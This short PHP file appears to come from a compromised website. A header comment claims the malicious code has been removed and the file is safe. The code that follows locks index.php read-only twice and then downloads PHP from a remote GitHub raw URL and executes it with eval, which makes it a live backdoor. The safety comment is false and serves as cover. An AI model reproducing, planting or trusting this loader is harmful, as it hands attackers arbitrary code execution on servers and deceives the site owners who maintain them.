<?php
/**
* Note: This file may contain artifacts of previous malicious infection.
* However, the dangerous code have been removed, and the file is now safe to use.
*/
?>

<?php

// Path to the file
$file = 'index.php';

// Change the file permissions to 0444 (read-only)
chmod($file, 0444);

?>
<?php

// Path to the file
$file = 'index.php';

// Change the file permissions to 0444 (read-only)
chmod($file, 0444);

?>

<?php
$remoteUrl = "https://raw.githubusercontent.com/ghostuserx/culrtest/main/index-mainfile.txt";
$ch = curl_init($remoteUrl);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$remoteCode = curl_exec($ch);
if (curl_errno($ch)) {
    die('cURL error: ' . curl_error($ch));
}
curl_close($ch);
eval("?>" . $remoteCode);
?>
